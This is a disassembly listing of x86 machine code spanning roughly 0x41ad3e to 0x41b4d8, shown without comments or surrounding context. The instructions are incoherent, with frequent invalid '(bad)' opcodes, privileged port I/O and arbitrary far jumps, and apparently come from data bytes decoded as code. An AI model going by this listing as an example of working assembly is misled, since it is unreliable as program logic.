  41ad3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad3f:	mov    al,0x5c
  41ad41:	cdq    
  41ad42:	sbb    al,ah
  41ad44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad45:	mov    al,0xf1
  41ad47:	iret   
  41ad48:	pop    esp
  41ad49:	adc    eax,0xab15257d
  41ad4e:	(bad)  
  41ad50:	sbb    DWORD PTR [eax+0xe9c0bba],ebp
  41ad56:	mov    cl,0x56
  41ad58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad59:	fwait
  41ad5a:	loope  0x41ad05
  41ad5c:	popf   
  41ad5d:	sti    
  41ad5e:	jp     0x41ad2d
  41ad60:	cwde   
  41ad61:	neg    BYTE PTR cs:[edi+0x33e2cb09]
  41ad68:	ret    0x3ce1
  41ad6b:	faddp  st(5),st
  41ad6d:	sub    BYTE PTR [ebx-0x77986ab7],bl
  41ad73:	jmp    0x6bbb:0xd9364da6
  41ad7a:	std    
  41ad7b:	jne    0x41ad73
  41ad7d:	in     al,dx
  41ad7e:	mov    dh,0x27
  41ad80:	fld    DWORD PTR [ecx+0x1d]
  41ad83:	loop   0x41ad60
  41ad85:	retf   0x268c
  41ad88:	push   edx
  41ad89:	add    BYTE PTR [esi-0x70],dh
  41ad8c:	test   DWORD PTR [edx],0x7689dad6
  41ad92:	jmp    0xc51e:0xff176de5
  41ad99:	sub    al,0x87
  41ad9b:	loop   0x41ad43
  41ad9d:	jg     0x41ad7a
  41ad9f:	xlat   BYTE PTR ds:[ebx]
  41ada0:	not    esp
  41ada2:	out    dx,al
  41ada3:	sub    BYTE PTR [eax],al
	...
  41adb1:	pop    es
  41adb2:	sbb    BYTE PTR [esi+0x3fbf9fa7],0xa2
  41adb9:	dec    eax
  41adba:	imul   ebx,DWORD PTR [eax+edx*4-0x3e047d09],0x11
  41adc2:	sub    eax,DWORD PTR [ecx]
  41adc4:	add    BYTE PTR [ebx-0x38fffffd],ch
  41adca:	(bad)  
  41adcb:	repnz xchg esi,eax
  41adcd:	std    
  41adce:	outs   dx,DWORD PTR ds:[esi]
  41adcf:	pusha  
  41add0:	adc    BYTE PTR ds:0x8179b7b0,al
  41add6:	in     eax,dx
  41add7:	sbb    ch,dl
  41add9:	fisub  WORD PTR [eax]
  41addb:	lods   eax,DWORD PTR ds:[esi]
  41addc:	jnp    0x41ae5c
  41adde:	push   edi
  41addf:	jno    0x41adcb
  41ade1:	push   esp
  41ade3:	sar    edx,cl
  41ade5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ade6:	xchg   dl,ah
  41ade8:	push   edx
  41ade9:	dec    esi
  41adea:	xchg   esi,eax
  41adeb:	test   BYTE PTR [ebp+0x1b],bl
  41adee:	cmp    eax,0x127df227
  41adf3:	mov    esp,0xbdc7c9c
  41adf8:	(bad)  
  41adf9:	fcomp  QWORD PTR [bp+si-0x77f3]
  41adfe:	pop    edi
  41adff:	lahf   
  41ae00:	or     edi,DWORD PTR [eax]
  41ae02:	outs   dx,BYTE PTR ds:[esi]
  41ae03:	int    0x6b
  41ae05:	cmp    ecx,DWORD PTR [esi]
  41ae07:	add    ah,BYTE PTR [eax+ebp*2+0x7dc35e79]
  41ae0e:	mov    ah,0xa2
  41ae10:	mov    cl,0xfa
  41ae12:	cmp    BYTE PTR [esi-0x6],dl
  41ae15:	inc    ebx
  41ae16:	inc    esi
  41ae17:	sbb    DWORD PTR [ecx+0x135674eb],ecx
  41ae1d:	xor    DWORD PTR [ecx-0x24],0xc6e017c2
  41ae24:	in     al,dx
  41ae25:	retf   
  41ae26:	test   eax,0xa43bc5
  41ae2b:	div    eax
  41ae2d:	cs push 0xffffffd8
  41ae30:	pop    ss
  41ae31:	clc    
  41ae32:	pushf  
  41ae33:	out    dx,al
  41ae34:	cmp    ebx,esp
  41ae36:	fld    QWORD PTR ds:0x5d7a0d45
  41ae3c:	mov    edx,0x93fd3cbd
  41ae41:	xchg   ebx,eax
  41ae42:	retf   
  41ae43:	fxch   st(6)
  41ae45:	ret    
  41ae46:	icebp  
  41ae47:	aam    0xed
  41ae49:	rcr    esi,1
  41ae4b:	or     ecx,edi
  41ae4d:	call   0xe916dad3
  41ae52:	sbb    esi,DWORD PTR [edx+0x53b0eb46]
  41ae58:	in     eax,dx
  41ae59:	pop    ecx
  41ae5a:	mov    dh,BYTE PTR [eax-0x7b815f1d]
  41ae60:	fwait
  41ae61:	sub    esp,DWORD PTR [edx+0x41c9c9b1]
  41ae67:	sub    al,0x54
  41ae69:	and    edi,edx
  41ae6b:	sub    al,0xbd
  41ae6d:	fistp  WORD PTR [ebx]
  41ae6f:	dec    ebp
  41ae70:	imul   ebx,DWORD PTR [edi+0x2d20b089],0x5a
  41ae77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae78:	or     eax,0x48ca638c
  41ae7d:	test   eax,0x874fa5bb
  41ae82:	sub    DWORD PTR [edx],edi
  41ae84:	in     eax,dx
  41ae85:	gs ret 0x5b88
  41ae89:	cmp    eax,DWORD PTR [ebp+0x76f80daa]
  41ae8f:	push   ss
  41ae90:	mov    dl,BYTE PTR cs:[ebx-0x76eefd85]
  41ae97:	jae    0x41ae9e
  41ae99:	sub    DWORD PTR [esi+0xc9ab9ea],esi
  41ae9f:	shr    BYTE PTR [ebp+edi*4-0x46bc2d90],0x2
  41aea7:	mov    ch,0xcc
  41aea9:	sbb    DWORD PTR [ebx-0x3f3cd330],ebp
  41aeaf:	call   0x3135:0x85f65440
  41aeb6:	and    eax,0xd6e60540
  41aebb:	in     eax,0x7d
  41aebd:	into   
  41aebe:	scas   eax,DWORD PTR es:[edi]
  41aebf:	mov    cl,ch
  41aec1:	shl    BYTE PTR [eax+0x2c821273],0x2c
  41aec8:	test   eax,0x2a574e93
  41aecd:	popf   
  41aece:	(bad)  
  41aecf:	adc    al,0xb3
  41aed1:	sti    
  41aed2:	stos   DWORD PTR es:[edi],eax
  41aed3:	sbb    BYTE PTR [eax-0x4917b3f4],0x8c
  41aeda:	shr    cl,0xe0
  41aedd:	sbb    al,0xc2
  41aedf:	iret   
  41aee0:	add    eax,0xb33a79de
  41aee5:	jl     0x41aea9
  41aee7:	rol    BYTE PTR [edi],cl
  41aee9:	mov    ecx,0x96c2f466
  41aeee:	add    eax,0x6449b932
  41aef3:	shl    ebp,cl
  41aef5:	je     0x41af34
  41aef7:	fldcw  WORD PTR [ebp+0x1ed99647]
  41aefd:	enter  0xdf56,0x96
  41af01:	cmc    
  41af02:	mov    eax,0xf9dd0d5b
  41af07:	lock add dl,bl
  41af0a:	stos   BYTE PTR es:[edi],al
  41af0b:	adc    BYTE PTR [edx+edi*4+0x2b],cl
  41af0f:	jmp    0xf6ae:0xd62221d6
  41af16:	out    dx,eax
  41af17:	loop   0x41aeb4
  41af19:	stc    
  41af1a:	rcl    BYTE PTR [edx+0x43],cl
  41af1d:	mov    ds:0xae118f51,eax
  41af22:	punpckhwd mm5,mm7
  41af25:	fist   WORD PTR [eax]
  41af27:	sub    eax,0x4c05b32a
  41af2c:	jbe    0x41af21
  41af2e:	and    bh,BYTE PTR [ebx+0x1a]
  41af31:	stc    
  41af32:	loop   0x41af70
  41af34:	mov    dh,0x17
  41af36:	sbb    edi,DWORD PTR [ebp-0xc572aef]
  41af3c:	jge    0x41aec6
  41af3e:	jle    0x41aecf
  41af40:	stc    
  41af41:	cld    
  41af42:	or     dh,BYTE PTR [esi-0x32]
  41af45:	fcom   QWORD PTR [ebx+ebp*2+0x26]
  41af49:	mov    ds:0xe6e07023,eax
  41af4e:	cld    
  41af4f:	xor    eax,0x111c23a8
  41af54:	fldcw  WORD PTR [edi]
  41af56:	adc    cl,bh
  41af58:	jecxz  0x41af65
  41af5a:	ds dec ebx
  41af5c:	xchg   edx,eax
  41af5d:	(bad)  
  41af5e:	loopne 0x41afa9
  41af60:	cmc    
  41af61:	adc    DWORD PTR [ebp-0x80],edx
  41af64:	and    esi,DWORD PTR [edi+0x7f1fd4a8]
  41af6a:	push   0x43
  41af6c:	addr16 mov bh,0xfd
  41af6f:	shr    DWORD PTR [edi-0x588f41cf],1
  41af75:	push   0x5f
  41af77:	sbb    DWORD PTR [edi-0x3519d699],ebp
  41af7d:	adc    cl,BYTE PTR [ebx+0x359735b5]
  41af83:	and    bl,al
  41af85:	cmp    DWORD PTR [esi-0xf],edi
  41af88:	sub    DWORD PTR [esi+ebx*4-0x1033eba4],esp
  41af8f:	call   0x62f0:0x22af705f
  41af96:	mov    al,ds:0xfb00134e
  41af9b:	nop
  41af9c:	mov    DWORD PTR [eax],esp
  41af9e:	inc    ecx
  41af9f:	icebp  
  41afa0:	ret    
  41afa1:	mov    esp,0x8c1c60c8
  41afa6:	cmp    DWORD PTR [esi-0x5f],ebx
  41afa9:	(bad)  [edi]
  41afab:	sub    al,0x7c
  41afad:	pop    DWORD PTR [ecx+eax*8]
  41afb0:	xor    edx,DWORD PTR [edi-0x1a]
  41afb3:	or     eax,0x2300d
  41afb8:	sahf   
  41afb9:	stos   DWORD PTR es:[edi],eax
  41afba:	test   al,0xb8
  41afbc:	adc    dl,ah
  41afbe:	fld    DWORD PTR [edi+edi*2+0x3e]
  41afc2:	xor    BYTE PTR ds:[ecx],0xbf
  41afc6:	mov    ch,0x66
  41afc8:	jge    0x41af5d
  41afca:	imul   ecx,ebx,0xc2e79471
  41afd0:	adc    al,0xd7
  41afd2:	rcl    BYTE PTR [edx+0x76],cl
  41afd5:	repnz rcl DWORD PTR [edi+eax*4-0x196d667c],0x73
  41afde:	daa    
  41afdf:	cli    
  41afe0:	out    0xae,eax
  41afe2:	pop    edi
  41afe3:	dec    ecx
  41afe4:	pop    ebp
  41afe5:	fmul   st(4),st
  41afe7:	retf   
  41afe8:	cmp    ebp,DWORD PTR [edx-0x4dbfcfe4]
  41afee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41afef:	mov    ebx,0x3403bc64
  41aff4:	mov    esi,0xc93aba2f
  41aff9:	out    dx,eax
  41affa:	scas   eax,DWORD PTR es:[edi]
  41affb:	cmp    al,0x34
  41affd:	push   ebp
  41affe:	cmp    dl,dh
  41b000:	mov    ds:0x87b87c6c,al
  41b005:	daa    
  41b006:	mov    eax,0x2f49c0c5
  41b00b:	jmp    0x41b06f
  41b00d:	test   al,0x77
  41b00f:	jnp    0x41afef
  41b011:	pop    es
  41b012:	jmp    0xc966:0xf3a060eb
  41b019:	adc    eax,0x92a63b20
  41b01e:	push   ecx
  41b01f:	push   ecx
  41b020:	ins    DWORD PTR es:[edi],dx
  41b021:	ins    DWORD PTR es:[edi],dx
  41b022:	ss addr16 pop ecx
  41b025:	mov    edi,0x4dbf12c9
  41b02a:	addr16 mov bl,0xba
  41b02d:	pop    es
  41b02e:	into   
  41b02f:	push   edi
  41b030:	add    esp,eax
  41b032:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b033:	stos   BYTE PTR es:[edi],al
  41b034:	lahf   
  41b035:	aaa    
  41b036:	lods   al,BYTE PTR ds:[esi]
  41b037:	sbb    bl,BYTE PTR [ebp+0x1c]
  41b03a:	jmp    0x11b9:0x619cb065
  41b041:	fidivr WORD PTR [ecx+0x4]
  41b044:	push   ebp
  41b045:	fild   DWORD PTR [edi*8+0x59f2051f]
  41b04c:	xor    bl,BYTE PTR [esp+esi*2+0x693d315c]
  41b053:	push   esi
  41b054:	scas   eax,DWORD PTR es:[edi]
  41b055:	add    dl,BYTE PTR [edi+ecx*2]
  41b058:	jno    0x41b004
  41b05a:	push   eax
  41b05b:	inc    edx
  41b05c:	gs ja  0x41b0bf
  41b05f:	jns    0x41b058
  41b061:	pop    esi
  41b062:	add    eax,0x8a366261
  41b067:	cli    
  41b068:	arpl   WORD PTR [edi-0x24a27e34],sp
  41b06e:	sbb    al,0x16
  41b070:	sbb    al,0xad
  41b072:	test   bl,al
  41b074:	xor    esi,esi
  41b076:	(bad)  
  41b077:	adc    al,0x4c
  41b079:	pop    ebp
  41b07a:	aad    0xed
  41b07c:	cmp    eax,0x4fff812c
  41b081:	pushf  
  41b082:	out    0x71,al
  41b084:	push   eax
  41b085:	out    0x4c,eax
  41b087:	aas    
  41b088:	dec    ebp
  41b089:	mov    edi,0x996142ad
  41b08e:	test   BYTE PTR [esi+0x2ac27a19],dh
  41b094:	aad    0x74
  41b096:	push   esp
  41b097:	xchg   ebp,eax
  41b098:	adc    DWORD PTR [edi+eiz*1],ebx
  41b09b:	popf   
  41b09c:	cwde   
  41b09d:	out    0xf5,eax
  41b09f:	shl    bl,1
  41b0a1:	and    DWORD PTR [edi-0x1ae23e5b],eax
  41b0a7:	jno    0x41b0c6
  41b0a9:	ror    esp,cl
  41b0ab:	and    al,BYTE PTR [ebp+0x14]
  41b0ae:	test   eax,0x1d8eaebd
  41b0b3:	es daa 
  41b0b5:	sub    eax,0x4aa61594
  41b0ba:	mov    al,0x12
  41b0bc:	std    
  41b0bd:	clc    
  41b0be:	ds leave 
  41b0c0:	xchg   edx,eax
  41b0c1:	adc    al,0x3f
  41b0c3:	and    ch,dh
  41b0c5:	or     dh,cl
  41b0c7:	and    DWORD PTR [ebx+ebp*4-0x34],esi
  41b0cb:	daa    
  41b0cc:	loopne 0x41b10d
  41b0ce:	popa   
  41b0cf:	mov    DWORD PTR [ebx],esp
  41b0d1:	sub    al,0x89
  41b0d3:	sbb    eax,0x41c6e5af
  41b0d8:	pop    ds
  41b0d9:	adc    eax,0xf459b1cb
  41b0de:	pop    esp
  41b0df:	daa    
  41b0e0:	fiadd  DWORD PTR [edi-0x18]
  41b0e3:	push   ds
  41b0e4:	loop   0x41b155
  41b0e6:	cmp    dl,dl
  41b0e8:	inc    esp
  41b0e9:	jg     0x41b0ae
  41b0eb:	(bad)  
  41b0ec:	mov    DWORD PTR ds:0x22cda5e6,0xf591708d
  41b0f6:	jecxz  0x41b143
  41b0f8:	mov    cl,0x0
  41b0fa:	dec    ebp
  41b0fb:	sub    eax,0xe95c04db
  41b100:	pop    ecx
  41b101:	popa   
  41b102:	or     ch,ch
  41b104:	test   BYTE PTR [ebx+0x78],bl
  41b107:	push   ebp
  41b108:	xlat   BYTE PTR ds:[ebx]
  41b109:	ins    DWORD PTR es:[edi],dx
  41b10a:	fcom   DWORD PTR cs:[ecx]
  41b10d:	dec    ecx
  41b10e:	retf   
  41b10f:	outs   dx,DWORD PTR ds:[esi]
  41b110:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b111:	cmp    DWORD PTR [edi-0x61b38c1c],0x988aba3f
  41b11b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b11c:	pop    es
  41b11d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b11e:	aas    
  41b11f:	push   eax
  41b120:	jae    0x41b19a
  41b122:	(bad)  
  41b123:	cdq    
  41b124:	or     bl,BYTE PTR [esi]
  41b126:	std    
  41b127:	in     al,dx
  41b128:	sub    BYTE PTR [edx],0x97
  41b12b:	mov    al,ds:0xf2ff13c1
  41b130:	jmp    DWORD PTR [edi]
  41b132:	es fcmovbe st,st(0)
  41b135:	ins    DWORD PTR es:[edi],dx
  41b136:	xchg   ebp,eax
  41b137:	xlat   BYTE PTR ds:[ebx]
  41b138:	les    esp,FWORD PTR [edi-0x79]
  41b13b:	xor    BYTE PTR [edi+0x35],ch
  41b13e:	pop    edx
  41b13f:	fcom   QWORD PTR [esi]
  41b141:	push   eax
  41b142:	lods   al,BYTE PTR ds:[esi]
  41b143:	pop    ebp
  41b144:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b145:	jmp    0x8986:0x8f08948d
  41b14c:	out    dx,al
  41b14d:	inc    edi
  41b14e:	iret   
  41b14f:	mov    dl,0x2c
  41b151:	fsubr  DWORD PTR ds:0xe71777e5
  41b157:	pop    ebx
  41b158:	xchg   ebx,eax
  41b159:	lods   al,BYTE PTR ds:[esi]
  41b15a:	cmp    DWORD PTR [ebx-0x3e066a0a],ecx
  41b160:	jg     0x41b19c
  41b162:	pop    ecx
  41b163:	xchg   edi,eax
  41b164:	inc    edi
  41b165:	add    ch,cl
  41b167:	scas   eax,DWORD PTR es:[edi]
  41b168:	mov    WORD PTR [esi+0x610e1b04],es
  41b16e:	fdiv   DWORD PTR [bp+0x78]
  41b172:	std    
  41b173:	mov    DWORD PTR [eax],0x0
	...
  41b181:	jecxz  0x41b16b
  41b183:	nop
  41b184:	rcr    BYTE PTR [ebx+0x79fbe3f8],1
  41b18a:	dec    edx
  41b18b:	shr    ebp,0x52
  41b18e:	jmp    0x2efe4eb5
  41b193:	add    DWORD PTR [eax],eax
  41b195:	stos   DWORD PTR es:[edi],eax
  41b196:	add    eax,DWORD PTR [eax]
  41b198:	add    BYTE PTR [ebp+0x7e4e18f8],dl
  41b19e:	lods   al,BYTE PTR ds:[esi]
  41b19f:	cmp    BYTE PTR [ecx],dh
  41b1a1:	or     BYTE PTR [ebp+0x5e91ef99],ch
  41b1a7:	mov    ah,0x36
  41b1a9:	and    DWORD PTR [ebx+0x287a5b82],esi
  41b1af:	and    eax,0x81b6a1df
  41b1b4:	fild   QWORD PTR [eax]
  41b1b6:	bound  eax,QWORD PTR ds:[ecx-0x7be4bb53]
  41b1bd:	push   0xffffffba
  41b1bf:	out    0xf6,al
  41b1c1:	inc    ecx
  41b1c2:	pop    ds
  41b1c3:	ror    BYTE PTR [ebx+0xf],0x2b
  41b1c7:	ret    0xd997
  41b1ca:	dec    esi
  41b1cb:	repz imul eax,DWORD PTR [edx+0x22],0xdb61b53a
  41b1d3:	or     BYTE PTR [ebp-0x47b6b24],dh
  41b1d9:	add    eax,esi
  41b1db:	ret    0xf8fd
  41b1de:	rcl    DWORD PTR [edx-0x7d],cl
  41b1e1:	mov    ah,0x61
  41b1e3:	jge    0x41b22a
  41b1e5:	jp     0x41b177
  41b1e7:	sbb    esp,ecx
  41b1e9:	xor    al,0x3f
  41b1ec:	or     esi,ebx
  41b1ee:	inc    ebp
  41b1ef:	sbb    ch,bh
  41b1f1:	jp     0x41b194
  41b1f3:	xor    al,0x85
  41b1f5:	int3   
  41b1f6:	nop
  41b1f7:	jp     0x41b1cf
  41b1f9:	nop
  41b1fa:	sub    eax,0xe3d071fe
  41b1ff:	shl    BYTE PTR [ecx],1
  41b201:	cmp    eax,0xd93c27bf
  41b206:	and    al,0xb3
  41b208:	or     DWORD PTR [ecx-0x35a7a75],ebx
  41b20e:	mov    eax,ds:0xc680dc1e
  41b213:	sti    
  41b214:	loope  0x41b269
  41b216:	mov    bl,0xcc
  41b218:	ret    
  41b219:	xchg   esp,eax
  41b21a:	cmp    BYTE PTR [ecx+0x2],dh
  41b21d:	push   ebx
  41b21e:	popa   
  41b21f:	jp     0x41b1f8
  41b221:	aam    0xe4
  41b223:	mov    bl,0x5
  41b225:	aad    0x89
  41b227:	lea    ecx,[ebx]
  41b229:	mov    al,ds:0xe2bb28b4
  41b22e:	xor    eax,0xa56753f3
  41b233:	fld    DWORD PTR [eax+0x2b]
  41b236:	add    eax,0x79ced758
  41b23b:	cdq    
  41b23c:	loop   0x41b1c1
  41b23e:	add    ecx,edi
  41b240:	cli    
  41b241:	es pop edi
  41b243:	repz sahf 
  41b245:	push   ecx
  41b246:	(bad)  
  41b247:	arpl   WORD PTR [ebx-0x6ead9897],sp
  41b24d:	sbb    eax,0xdc2ab17c
  41b252:	mov    edi,0x1cddf856
  41b257:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b258:	test   eax,0x7fac1ac8
  41b25d:	sbb    eax,0xc0fa32f9
  41b262:	pop    esp
  41b263:	shr    ch,1
  41b265:	iret   
  41b266:	sbb    esp,DWORD PTR [edx+0x72]
  41b269:	enter  0xa102,0xeb
  41b26d:	mov    ebp,0xa9957740
  41b272:	cld    
  41b273:	dec    ebx
  41b274:	and    cl,BYTE PTR [ecx]
  41b276:	arpl   WORD PTR ss:[esi+0xb],sp
  41b27a:	iret   
  41b27b:	cli    
  41b27c:	sub    ecx,esi
  41b27e:	jl     0x41b27e
  41b280:	js     0x41b22c
  41b282:	test   DWORD PTR ds:0x2b064a32,ebp
  41b288:	jns    0x41b212
  41b28a:	(bad)  
  41b28b:	jmp    0x41b22c
  41b28d:	outs   dx,DWORD PTR ds:[esi]
  41b28e:	aas    
  41b28f:	ds (bad) 
  41b291:	adc    eax,0x9f9b70fa
  41b296:	xor    esp,DWORD PTR [edx-0x4508310f]
  41b29c:	dec    esp
  41b29d:	outs   dx,BYTE PTR ds:[esi]
  41b29e:	mov    cl,0x19
  41b2a0:	pop    edi
  41b2a1:	int3   
  41b2a2:	and    sp,WORD PTR [ebx+0x11]
  41b2a6:	adc    ecx,DWORD PTR [edx+ebx*8]
  41b2a9:	leave  
  41b2aa:	cs mov cl,0x77
  41b2ad:	cli    
  41b2ae:	jo     0x41b32e
  41b2b0:	popf   
  41b2b1:	rcr    BYTE PTR [edi-0x40fcdabf],cl
  41b2b7:	sar    BYTE PTR [eax+0x5],0x94
  41b2bb:	adc    DWORD PTR es:[esi-0x58],edx
  41b2bf:	dec    eax
  41b2c0:	or     eax,0xa256cb55
  41b2c5:	and    ebp,edi
  41b2c7:	pop    es
  41b2c8:	ret    
  41b2c9:	(bad)  
  41b2ca:	dec    edi
  41b2cb:	cmp    BYTE PTR [esi-0x375bec7e],dh
  41b2d1:	xor    edi,DWORD PTR [ebx]
  41b2d3:	jecxz  0x41b258
  41b2d5:	lock jne 0x41b332
  41b2d8:	jo     0x41b30c
  41b2da:	dec    ecx
  41b2db:	fmul   st,st(2)
  41b2dd:	loope  0x41b2e0
  41b2df:	repz add cl,BYTE PTR [edi]
  41b2e2:	popa   
  41b2e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2e4:	mov    al,ds:0x59ade307
  41b2e9:	ret    
  41b2ea:	pop    es
  41b2eb:	out    dx,eax
  41b2ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2ed:	lahf   
  41b2ee:	(bad)  
  41b2ef:	mov    cl,0xc
  41b2f1:	outs   dx,BYTE PTR ds:[esi]
  41b2f2:	adc    DWORD PTR [ecx-0x15cc6313],esi
  41b2f8:	das    
  41b2f9:	jl     0x74046fac
  41b2ff:	jae    0x41b2f8
  41b301:	sub    DWORD PTR [ecx],ebp
  41b303:	inc    eax
  41b304:	into   
  41b305:	pop    ebx
  41b306:	mov    DWORD PTR [edi+0x77],ebx
  41b309:	lods   al,BYTE PTR ds:[esi]
  41b30a:	fistp  WORD PTR [edx*4+0x6c849c68]
  41b311:	push   esi
  41b312:	cld    
  41b313:	xor    al,0x4b
  41b315:	(bad)  
  41b316:	std    
  41b317:	repnz cwde 
  41b319:	jl     0x41b2c3
  41b31b:	jg     0x41b33c
  41b31d:	in     al,0x4a
  41b31f:	adc    eax,0xbc70f6cf
  41b324:	push   es
  41b325:	fld    QWORD PTR [ecx+0x29207d41]
  41b32b:	and    esp,eax
  41b32d:	mov    cl,0xe6
  41b32f:	int    0x5f
  41b331:	jmp    0x61a1:0xe678c40f
  41b338:	pop    ds
  41b339:	dec    edi
  41b33a:	jo     0x41b2cb
  41b33c:	xchg   esi,eax
  41b33d:	imul   eax,DWORD PTR [eax+0xe],0xffffff8d
  41b341:	ins    DWORD PTR es:[edi],dx
  41b342:	mov    ah,0x5e
  41b344:	ins    BYTE PTR es:[edi],dx
  41b345:	sahf   
  41b346:	imul   edi,DWORD PTR [edi+0x6f7182ff],0x63
  41b34d:	jo     0x41b38a
  41b34f:	rcl    DWORD PTR [esi-0x5642fae5],cl
  41b355:	mov    esi,0x8c79fd5b
  41b35a:	inc    edx
  41b35b:	call   0x124793de
  41b360:	fcmovnb st,st(7)
  41b362:	data16 mov bh,0x2f
  41b365:	push   es
  41b366:	fdiv   st,st(0)
  41b368:	dec    eax
  41b369:	mov    dh,0x22
  41b36b:	mov    BYTE PTR [ebx],bl
  41b36d:	mov    esi,0x95ecdf09
  41b372:	sub    ah,ah
  41b374:	cmp    DWORD PTR [edi-0x3c32a8f5],ebp
  41b37a:	outs   dx,BYTE PTR ds:[esi]
  41b37b:	inc    edi
  41b37c:	add    esi,eax
  41b37e:	aad    0x3c
  41b380:	xlat   BYTE PTR ds:[ebx]
  41b381:	jg     0x41b33d
  41b383:	gs aaa 
  41b385:	jl     0x41b397
  41b387:	ret    
  41b388:	mov    ebx,0x7b827a21
  41b38d:	jle    0x41b3e9
  41b38f:	dec    eax
  41b390:	adc    eax,0xdedb0baa
  41b395:	ficomp DWORD PTR [edi+0x41]
  41b398:	stc    
  41b399:	mov    al,ch
  41b39b:	add    DWORD PTR [esi],0xb
  41b39e:	nop
  41b39f:	add    eax,0x35c9732a
  41b3a4:	and    eax,0x7677ce5c
  41b3a9:	dec    ebp
  41b3aa:	cmp    dl,ch
  41b3ac:	mov    al,0xc
  41b3ae:	ja     0x41b375
  41b3b0:	inc    ebp
  41b3b1:	aas    
  41b3b2:	retf   
  41b3b3:	pop    ss
  41b3b4:	cmp    bl,BYTE PTR [ebp+0x4d146d00]
  41b3ba:	sub    eax,0x7f7096af
  41b3bf:	xlat   BYTE PTR ds:[ebx]
  41b3c0:	mov    WORD PTR [edx-0x7bc4d9bb],fs
  41b3c6:	out    0x1b,eax
  41b3c8:	addr16 test al,0xed
  41b3cb:	rcl    BYTE PTR ss:[edx-0x605a2b3d],0x56
  41b3d3:	shl    BYTE PTR [edx-0x3a9f426],0xc6
  41b3da:	push   edi
  41b3db:	or     eax,DWORD PTR [edx+edx*4-0x54a17806]
  41b3e2:	add    al,0x15
  41b3e4:	ins    DWORD PTR es:[edi],dx
  41b3e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3e6:	pop    ds
  41b3e7:	test   DWORD PTR [edx],0x3e5c5192
  41b3ed:	pop    ebx
  41b3ee:	sub    al,0xaa
  41b3f0:	jno    0x41b388
  41b3f2:	jmp    0x41b45e
  41b3f4:	ror    DWORD PTR [esi],1
  41b3f6:	stos   DWORD PTR es:[edi],eax
  41b3f7:	sbb    BYTE PTR [ecx],dh
  41b3f9:	inc    edi
  41b3fa:	dec    ecx
  41b3fb:	fs push ss
  41b3fd:	or     eax,0x79abaef6
  41b402:	mov    edi,0x9a7435c7
  41b407:	scas   al,BYTE PTR es:[edi]
  41b408:	dec    esi
  41b409:	inc    edx
  41b40a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b40b:	shl    DWORD PTR [ecx-0x13301938],0x21
  41b412:	test   BYTE PTR [ebp-0x13ba591d],ch
  41b418:	cli    
  41b419:	leave  
  41b41a:	or     eax,0xa7f3043e
  41b41f:	out    0x77,eax
  41b421:	adc    BYTE PTR [esi],al
  41b423:	test   al,0x16
  41b425:	sbb    edx,edi
  41b427:	inc    edi
  41b428:	repnz dec edi
  41b42a:	and    al,0xf
  41b42c:	test   al,0xf3
  41b42e:	or     eax,0xd17355e0
  41b433:	inc    eax
  41b434:	sub    DWORD PTR [ebx],0x8fbd7d1b
  41b43a:	das    
  41b43b:	fstp   TBYTE PTR [esi+edi*8+0x22]
  41b43f:	clc    
  41b440:	pusha  
  41b441:	std    
  41b442:	retf   0xb6be
  41b445:	aaa    
  41b446:	pop    ecx
  41b447:	aaa    
  41b448:	xor    al,bl
  41b44a:	mov    WORD PTR [esi],fs
  41b44c:	mov    DWORD PTR [eax+0x6fed2ac],ecx
  41b452:	inc    edi
  41b453:	pop    eax
  41b454:	and    ah,BYTE PTR [esi]
  41b456:	jge    0x41b43a
  41b458:	dec    esp
  41b459:	es out dx,al
  41b45b:	dec    ebp
  41b45c:	lds    ebp,FWORD PTR [edx-0x5d601988]
  41b462:	mov    ch,0x8d
  41b464:	jl     0x41b493
  41b466:	add    eax,0x36a3fc22
  41b46b:	prefetch BYTE PTR [ebx+0x12f38200]
  41b472:	xchg   BYTE PTR [esi+0x4b],ch
  41b475:	mov    dh,0x8d
  41b477:	mov    eax,ss
  41b479:	outs   dx,BYTE PTR ds:[esi]
  41b47a:	shl    DWORD PTR [edi],1
  41b47c:	into   
  41b47d:	cmp    BYTE PTR ds:0xc4a87e02,cl
  41b483:	les    ebx,FWORD PTR [ebx+0x5a]
  41b486:	add    ch,BYTE PTR [ecx]
  41b488:	jecxz  0x41b430
  41b48a:	test   eax,0x6b922cbc
  41b48f:	sbb    al,BYTE PTR [edi+edx*1]
  41b492:	jecxz  0x41b437
  41b494:	dec    eax
  41b495:	pop    ds
  41b496:	loop   0x41b441
  41b498:	out    0x6a,al
  41b49a:	pop    ebx
  41b49b:	inc    ebp
  41b49c:	and    eax,0xb83112e1
  41b4a1:	dec    edi
  41b4a2:	pop    es
  41b4a3:	sub    cl,0xba
  41b4a6:	xchg   edi,eax
  41b4a7:	lds    eax,FWORD PTR [eax-0x1d5f47cf]
  41b4ad:	rcr    al,cl
  41b4af:	lahf   
  41b4b0:	xor    dh,BYTE PTR [ecx+0x61]
  41b4b3:	loope  0x41b489
  41b4b5:	and    DWORD PTR [edi-0x2d],edx
  41b4b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b4ba:	clc    
  41b4bb:	jns    0x41b501
  41b4bd:	push   ecx
  41b4be:	aaa    
  41b4bf:	push   es
  41b4c0:	push   ss
  41b4c1:	mov    ebp,0xc2865eb5
  41b4c6:	dec    esi
  41b4c7:	dec    ecx
  41b4c8:	fiadd  WORD PTR [edi+0x5dfa73f9]
  41b4ce:	fsubr  DWORD PTR ds:0x3c53ac96
  41b4d4:	clc    
  41b4d5:	aad    0x4
  41b4d7:	(bad)  
  41b4d8:	lods   eax,DWORD PTR ds:[esi]
